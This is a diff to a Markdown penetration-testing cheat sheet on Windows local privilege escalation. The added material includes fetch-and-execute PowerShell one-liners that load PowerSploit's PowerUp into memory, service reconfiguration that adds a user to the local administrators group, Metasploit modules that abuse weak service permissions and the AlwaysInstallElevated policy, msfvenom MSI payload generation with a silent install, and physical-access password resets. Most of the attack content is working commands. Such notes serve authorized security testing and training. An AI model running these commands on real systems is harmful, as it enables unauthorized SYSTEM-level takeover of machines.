@@ -25,32 +25,47 @@ current system:
 | **Writable directories** | dir /a-rd /s /b | | |
 | **Writable files** | dir /a-r-d /s /b | | | |
 
-###### Process, services, installed programs and scheduled tasks
+###### Enumeration scripts
 
-The following commands can be used to retrieve the process, services,
-installed programs and scheduled tasks of the host:
+Part of the enumeration process detailed below can be automated using scripts.
 
-|  | DOS | Powershell | WMI |
-|--|-----|------------|-----|
-| **Process** | tasklist | Get-Process<br/>Get-CimInstance Win32_Process &#124; select ProcessName, ProcessId &#124; fl *<br/>Get-CimInstance Win32_Process -Filter "name = 'PccNTMon.exe'" &#124; fl * | wmic process get CSName,Description,ExecutablePath,ProcessId |
+*Personal preference: `PowerSploit`'s `PowerUp` `Invoke-PrivescAudit` /
+`Invoke-AllChecks` (requires PowerShell) & off-target `Windows Exploit Suggester`*
 
-###### Network
+The PowerShell `PowerSploit`'s `PowerUp` `Invoke-PrivescAudit` /
+`Invoke-AllChecks` runs a number of configuration checks:
+  - Unquoted services path
+  - Weak services permissions
+  - "AlwaysInstallElevated" policy
+  - ...
 
-The following commands can be used to retrieve information about the network
-interfaces and active connections of the host:
+The PowerShell `PowerSploit`'s `PowerUp` can be loaded directly in memory
+using PowerShell `DownloadString` or through a `meterpreter` session:
 
-|  | DOS | Powershell | WMI |
-|--|-----|------------|-----|
-| Network interfaces | ipconfig | | |
-| Listening ports | netstat -ano | Get-NetTCPConnection <br/>Get-NetUDPEndpoint | |
+```
+powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellMafia/Pow
+erSploit/master/Privesc/PowerUp.ps1’); Invoke-AllChecks”
 
+PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
+erSploit/master/Privesc/PowerUp.ps1")
+PS> Invoke-AllChecks
+
+meterpreter> load powershell
+meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
+meterpreter> powershell_execute Invoke-AllChecks
+```
+
+Refer to the "Unpatched system - Exploits detection tools" paragraphe below for
+a detailed usage guide of `Windows Exploit Suggester`.  
 
 ### Physical access privileges escalation
 
 Physical access open up different ways to bypass user login screen and
-obtain SYSTEM access from no account.
+obtain SYSTEM access.
 
 ###### Hardened system
+
+*BIOS settings*
 
 The methods detailed below require to boot from a live CD/DVD or USB key. The
 possibility to do so may be disabled by BIOS settings. To conduct the
@@ -63,6 +78,12 @@ http://www.uktsupport.co.uk/reference/biosp.htm
 
 Ultimately, BIOS settings can be reseted by removing the CMOS battery or using
 the motherboard Jumper.
+
+*Encrypted disk*
+
+The methods detailed below require an access to the Windows filesystem and will
+not work on encrypted partitions if the password to decrypt the filesystem is
+not known.
 
 ###### PCUnlocker
 
@@ -77,7 +98,8 @@ passwords is as follow:
   2. Create a bootable USK key using Rufus with the PCUnlocker ISO.  
      If making an USB key for a computer with UEFI BIOS, pick the "GPT partition
      scheme for UEFI computer" option on Rufus
-  3. Boot on the USB Key thus created (boot order may need to be changed in BIOS)
+  3. Boot on the USB Key thus created (boot order may need to be changed in
+     BIOS)
   4. From the PCUnlocker GUI, pick an account and click the "Reset Password"
      button to reset the password to "Password123"
 
@@ -111,9 +133,9 @@ The procedure to do so is as follow:
   9. Change a user password (net user <USERNAME> <NEWPASSWORD>) or create a new
   user
 
-### File system & registry
+### Clear text passwords
 
-###### Clear text password in files
+###### Clear text passwords in files
 
 The builtin `findstr` and `dir` can be used to search for clear text passwords
 stored in files. The keyword 'password' shoudl be used first and the search
@@ -312,38 +334,56 @@ pyinstaller --onefile <SCRIPT>.py
 
 PyInstaller should be used on a Windows operating system.
 
-###### Third party components
+### Services misconfigurations
 
-The following third party components may be vulnerable and leveraged to
-privilege escalation:
+In Windows NT operating systems, a Windows service is a computer program that
+operates in the background, similarly in concept to a Unix daemon.
 
-```
-Ubiquiti UniFi Video
--- CVE-2016-6914
--- Affected versions: 3.7.3, 3.7.0, 3.2.2 & potentially older versions
--- Fixed in version 3.8.0
--- https://www.exploit-db.com/exploits/43390/
-```
+A Windows service must conform to the interface rules and protocols of the
+Service Control Manager, the component responsible for managing Windows
+services. Windows services can be configured to start with the operating system,
+manually or when an event occur.
 
-### Services
+Vulnerabilities in a service configuration could be exploited to execute code
+under the privileges of the user starting the service, often
+NT AUTHORITY\SYSTEM.
 
 ###### Weak services permissions
 
 A weak service permissions vulnerability occurs when an unprivileged user can
-alter the service binary so that the service runs a specified command or
-executable.  
+alter the service configuration or the service binary so that the service runs a
+specified command or executable.  
 
-The accesschk tool, from the Sysinternals suite, can be used to list the
-services an user can modify:
+The `accesschk` tool, from the Sysinternals suite, and the `Powershell`
+`PowerUp` script can be used to list the services an user can exploit:
 
 ```
+# Shows which services can be altered by the specified user
 accesschk.exe -accepteula -uwcqv <USERNAME> *
+accesschk64.exe -accepteula -uwcqv <USERNAME> *
 
 # Shows which services can be altered by everyone
-accesschk.exe -uwcqv "Everyone" *
+accesschk.exe -accepteula -uwcqv "Everyone" *
+accesschk64.exe -accepteula -uwcqv "Everyone" *
+accesschk.exe -accepteula -uwcqv "Tout le monde" *
+accesschk64.exe -accepteula -uwcqv "Tout le monde" *
 
 # Shows groups which can alter the service
 accesschk.exe -accepteula -uwcqv *
+accesschk64.exe -accepteula -uwcqv *
+
+# (PowerShell) PowerSploit's PowerUp Get-ModifiableServiceFile & Get-ModifiableService
+# Get-ModifiableServiceFile - returns services for which the current user can directly modify the binary file
+# Get-ModifiableService - returns services the current user can reconfigure
+PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
+erSploit/master/Privesc/PowerUp.ps1")
+PS> Get-ModifiableServiceFile
+PS> Get-ModifiableService
+
+meterpreter> load powershell
+meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
+meterpreter> powershell_execute Get-ModifiableServiceFile
+meterpreter> powershell_execute Get-ModifiableService
 ```
 
 The exploitable permissions are:
@@ -363,6 +403,11 @@ To alter the service configuration:
 sc config <SERVICENAME> binPath=net localgroup administrators <USERNAME> /add
 sc config <SERVICENAME> binPath=<NEWBINPATH>
 ```
+
+The `Metasploit` module `exploit/windows/local/service_permissions` can be used
+through an existing `meterpreter` session to automatically detect and exploit
+weak services permissions to execute a specified payload under NT
+AUTHORITY\SYSTEM privileges.
 
 ###### Unquoted services path
 
@@ -392,9 +437,9 @@ In the example, if an attacker has write privilege in C:\, he could create a
 C:\Service.exe and escalate its privileges to the level of the account that
 starts the service.  
 
-To find vulnerable services the wmic tool, the PowerUp script and the
-exploit/windows/local/trusted_service_path metasploit module can be used as
-well as a manual review of each service metadata using sc queries:
+To find vulnerable services the `wmic` tool and the `Powershell` `PowerUp`
+script can be used as well as a manual review of each service metadata using
+`sc` queries:
 
 ```
 # List services
@@ -403,21 +448,27 @@ sc query
 sc qc <SERVICENAME>
 
 # wmic
-wmic service get PathName, StartMode | findstr /i /v """
 wmic service get PathName, StartMode | findstr /i /v "C:\\Windows\\" | findstr /i /v """
-wmic service get name.pathname,startmode | findstr /i /v """
+wmic service get PathName, StartMode | findstr /i /v """
 wmic service get name.pathname,startmode | findstr /i /v """ | findstr /i /v "C:\\Windows\\"
+wmic service get name.pathname,startmode | findstr /i /v """
 
 # (PowerShell) PowerSploit's PowerUp Get-ServiceUnquoted
-IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
+PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
 erSploit/master/Privesc/PowerUp.ps1")
-Get-ServiceUnquoted
+PS> Get-ServiceUnquoted
 
-# Metasploit
-exploit/windows/local/trusted_service_path
+meterpreter> load powershell
+meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
+meterpreter> powershell_execute Get-ServiceUnquoted
 ```
 
-###### Exploit and restart a service
+The `Metasploit` module `exploit/windows/local/trusted_service_path` can be used
+through an existing `meterpreter` session to automatically detect and exploit
+weak services permissions to execute a specified payload under NT
+AUTHORITY\SYSTEM privileges.
+
+###### misc
 
 *Add a local administrator user*
 
@@ -425,7 +476,6 @@ The following C code can be used to add a local administrator user:
 
 ```
 #include <stdlib.h>
-
 
 int main() {
   int i;
@@ -457,9 +507,67 @@ net start <SERVICE>
 Start-Service -Name <SERVICE>
 ```
 
-### AlwaysInstallElevated
+### AlwaysInstallElevated policy
 
-TODO
+Windows provides a mechanism which allows unprivileged user to install Windows
+installation packages, Microsoft Windows Installer Package (MSI) files,
+with NT AUTHORITY\SYSTEM privileges. This policy is known as
+"AlwaysInstallElevated".
+
+If activated, this mechanism can be leveraged to elevate privileges on the
+system by executing code through the MSI during the installation process as
+NT AUTHORITY\SYSTEM.    
+
+The Windows builtin `req query` and the the `Powershell` `PowerUp` script can
+be used to check whether the "AlwaysInstallElevated" policy is deployed on the
+host be querying the registry:
+
+```
+# If "REG_DWORD 0x1" is returned the policy is activated
+# If not, the error message "ERROR: The system was unable to find the specified registry key or value." indicates that the policy is not set
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+Get-RegistryAlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# (PowerShell) PowerSploit's PowerUp Get-RegistryAlwaysInstallElevated
+PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
+erSploit/master/Privesc/PowerUp.ps1")
+PS> Get-RegistryAlwaysInstallElevated
+
+meterpreter> load powershell
+meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
+meterpreter> powershell_execute Get-RegistryAlwaysInstallElevated
+```
+
+The policy can be abused through a `meterpreter` session using the `Metasploit`
+module `exploit/windows/local/always_install_elevated`, by crafting a MSI with
+`msfvenom` or using the `Powershell` `PowerUp` script.
+
+Note that the `Metasploit` module
+`exploit/windows/local/always_install_elevated` will prevent the installation
+from succeeding to avoid the registration of the program on the system.  
+
+```
+# Requires a meterpreter session
+msf> use exploit/windows/local/always_install_elevated
+
+# msfvenom can be used to generate a MSI starting a Metasploit payload or using a provided binary  
+# Refer to the "[General] Shells" note for generating binaries that can bypass anti-virus detection
+# Refer to the "[General] File transfer" note for file transfer techniques to upload the MSI on the targeted system
+
+msfvenom -p <PAYLOAD> -f msi-nouac > <MSI_FILE>
+msfvenom -p windows/exec cmd="<BINARY_PATH>" -f msi-nouac > <MSI_FILE>
+
+# /quiet: no messages displayed, /qn: no GUI, /i runs as current user
+msiexec /quiet /qn /i <MSI_PATH>
+
+# (PowerShell) PowerSploit's PowerUp Write-UserAddMSI
+# Prompt a GUI interface to specify the user to be added
+PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
+erSploit/master/Privesc/PowerUp.ps1")
+PS> Write-UserAddMSI
+```
 
 ### Token Privileges abuse
 
@@ -561,3 +669,24 @@ psexec.exe -accepteula -s -i -d cmd.exe
 
 If a meterpreter is being used, the **getsystem** command can be leveraged to
 the same end.
+
+### TODO
+
+###### Process, services, installed programs and scheduled tasks
+
+The following commands can be used to retrieve the process, services,
+installed programs and scheduled tasks of the host:
+
+|  | DOS | Powershell | WMI |
+|--|-----|------------|-----|
+| **Process** | tasklist | Get-Process<br/>Get-CimInstance Win32_Process &#124; select ProcessName, ProcessId &#124; fl *<br/>Get-CimInstance Win32_Process -Filter "name = 'PccNTMon.exe'" &#124; fl * | wmic process get CSName,Description,ExecutablePath,ProcessId |
+
+###### Network
+
+The following commands can be used to retrieve information about the network
+interfaces and active connections of the host:
+
+|  | DOS | Powershell | WMI |
+|--|-----|------------|-----|
+| Network interfaces | ipconfig | | |
+| Listening ports | netstat -ano | Get-NetTCPConnection <br/>Get-NetUDPEndpoint | |
